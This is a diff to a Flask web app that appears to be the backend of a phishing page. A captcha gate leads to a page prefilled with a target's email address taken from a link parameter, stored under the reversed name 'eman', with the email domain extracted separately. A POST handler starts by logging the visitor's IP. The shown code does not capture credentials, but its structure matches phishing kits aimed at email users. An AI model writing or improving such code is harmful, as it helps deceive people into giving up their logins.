@@ -115,30 +115,25 @@ def captcha():
 
             return render_template('captcha.html', code=code, color=color, error=True)
 
-@app.route('/success')
+@app.route("/success")
 def success():
     if 'passed_captcha' in session and session['passed_captcha']:
-        web_param = request.args.get('web')
+        web_param = session.get('eman')
         return redirect(url_for('route2', web=web_param))
     else:
         return redirect(url_for('captcha'))
 
-
-@app.route("/m")
+@app.route("/")
 def route2():
-    web_param = request.args.get('web')
+    web_param = request.args.get('web') or session.get('eman')
     if web_param:
         session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
+        session['ins'] = web_param.split('@')[1] if '@' in web_param else None
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
 def first():
-    web_param = request.args.get('web')
-    if web_param:
-        eman = web_param
-	ins = web_param[web_param.index('@') + 1:]
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
